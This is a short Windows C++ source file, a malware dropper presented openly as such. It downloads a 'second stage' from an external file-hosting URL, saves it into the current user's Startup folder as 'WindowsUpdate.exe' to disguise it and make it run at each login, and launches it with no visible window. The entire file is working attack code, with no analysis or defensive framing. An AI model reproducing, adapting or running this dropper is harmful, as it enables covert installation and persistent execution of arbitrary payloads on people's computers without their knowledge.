// dropper.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <urlmon.h>
#include <shlobj_core.h>
#pragma comment (lib, "urlmon.lib")
#pragma comment (lib, "shell32.lib")
int main()
{   /*
    Resolve the path of shell:startup of current user
    Download 2nd stage from a url and drop into shell::startup
    Run the 2nd stage
    */

    const wchar_t* szURL = L"https://files.catbox.moe/l38kur.txt";
    wchar_t* ppszPath;
    //HRESULT SHGetKnownFolderPath(
    //    [in]           REFKNOWNFOLDERID rfid,
    //    [in]           DWORD            dwFlags,
    //    [in, optional] HANDLE           hToken,
    //    [out]          PWSTR * ppszPath
    //);
    HRESULT getStartUpResult = SHGetKnownFolderPath(
        FOLDERID_Startup,
        0,
        0,
        &ppszPath
    );

    //Get the fullPath = ppszPath + "\\<FileName>"
    wchar_t fullPath[MAX_PATH];
    wcscpy_s(fullPath, ppszPath);
    wcscat_s(fullPath, L"\\WindowsUpdate.exe");
    //HRESULT URLDownloadToFileW(
    //    LPUNKNOWN            pCaller,
    //    LPCTSTR              szURL,
    //    LPCTSTR              szFileName,
    //    _Reserved_ DWORD     dwReserved,
    //    LPBINDSTATUSCALLBACK lpfnCB
    //);
    HRESULT downloadResult = URLDownloadToFileW(
        0,
        szURL,
        fullPath,
        0,
        0
    );

    STARTUPINFO info = { sizeof(info) };
    PROCESS_INFORMATION processInfo;
    //BOOL CreateProcessA(
    //    [in, optional]      LPCSTR                lpApplicationName,
    //    [in, out, optional] LPSTR                 lpCommandLine,
    //    [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
    //    [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
    //    [in]                BOOL                  bInheritHandles,
    //    [in]                DWORD                 dwCreationFlags,
    //    [in, optional]      LPVOID                lpEnvironment,
    //    [in, optional]      LPCSTR                lpCurrentDirectory,
    //    [in]                LPSTARTUPINFOA        lpStartupInfo,
    //    [out]               LPPROCESS_INFORMATION lpProcessInformation
    //);
    BOOL createProcessResult = CreateProcessW(
        fullPath,
        0,
        0,
        0,
        FALSE,
        CREATE_NO_WINDOW,
        0,
        0,
        &info,
        &processInfo
    );

    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);

}

